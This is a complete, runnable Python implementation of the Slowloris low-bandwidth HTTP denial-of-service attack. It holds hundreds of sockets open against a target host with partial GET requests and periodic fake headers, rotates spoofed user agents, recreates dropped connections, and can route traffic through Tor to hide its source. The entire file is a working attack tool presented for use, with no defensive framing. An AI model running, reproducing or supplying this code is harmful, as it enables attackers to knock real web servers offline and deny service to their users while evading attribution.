import argparse
import random
import socket

import time

parser = argparse.ArgumentParser(description="Slowloris, low bandwidth HTTP GET request attack.")
parser.add_argument("host", metavar="HOST", help="target host")
parser.add_argument("-p", "--port", default="80", type=int, help="target port (default: 80)")
parser.add_argument("-s", "--sockets", default="200", type=int, help="number of sockets (default: 200)")
parser.add_argument("-t", "--time", default="15", type=int, help="number of seconds between packets (default: 15)")
parser.add_argument("--tor", action="store_true", help="try to connect to Tor on 127.0.0.1:9050")
args = parser.parse_args()

host = args.host
port = args.port
socket_count = args.sockets
wait_time = args.time
tor = args.tor
socket_list = []

ua_list = ["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
           "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
           "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
           "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
           "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
           "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
           "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
           "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
           "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
           "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
           "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
           "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
           "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
           "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
           "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
           "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
           "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
           "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
           "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
           "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
           "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
           "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
           "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02"]


def setup_socket():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((host, port))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 5000)).encode("utf-8"))
    s.send("Host: {}\r\n".format(host).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(ua_list)).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))

    return s


def main():

    try:
        print("\033[33m")
        print("   _____ _               _            _")
        print("  / ____| |             | |          (_)")
        print(" | (___ | | _____      _| | ___  _ __ _ ___")
        print("  \___ \| |/ _ \ \ /\ / / |/ _ \| '__| / __|")
        print("  ____) | | (_) \ V  V /| | (_) | |  | \__ \\")
        print(" |_____/|_|\___/ \_/\_/ |_|\___/|_|  |_|___/\n")
        print("\033[0m")

        if tor:
            try:
                import socks
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                socket.socket = socks.socksocket
                print("\033[32mTor connection established.\033[0m")

            except ImportError:
                print("\033[31mTor connection failed.\033[0m")
                raise SystemExit

        print("Starting attack on \033[36m{}:{}\033[0m with random user agents. Ctrl + C to stop.".format(host, port))

        for i in range(socket_count):
            try:
                s = setup_socket()
            except socket.error:
                break

            socket_list.append(s)

        print("Created \033[36m{} sockets.\033[0m".format(len(socket_list)))
        print("Sending keep-alive packets every \033[36m{} seconds.\033[0m".format(wait_time))

        while True:
            print("\033[32mSending requests.\033[0m")
            for s in socket_list:
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))

                except socket.error:
                    socket_list.remove(s)

            dead_sockets = socket_count - len(socket_list)
            if dead_sockets > 0:
                print("\033[31mRecreating {} dead sockets.\033[0m".format(socket_count - len(socket_list)))
                for i in range(dead_sockets):
                    try:
                        s = setup_socket()
                        socket_list.append(s)

                    except socket.error:
                        break

            time.sleep(wait_time)

    except KeyboardInterrupt:
        print("\n\033[31mStopping.\033[0m")

    finally:
        raise SystemExit


if __name__ == '__main__':
    main()
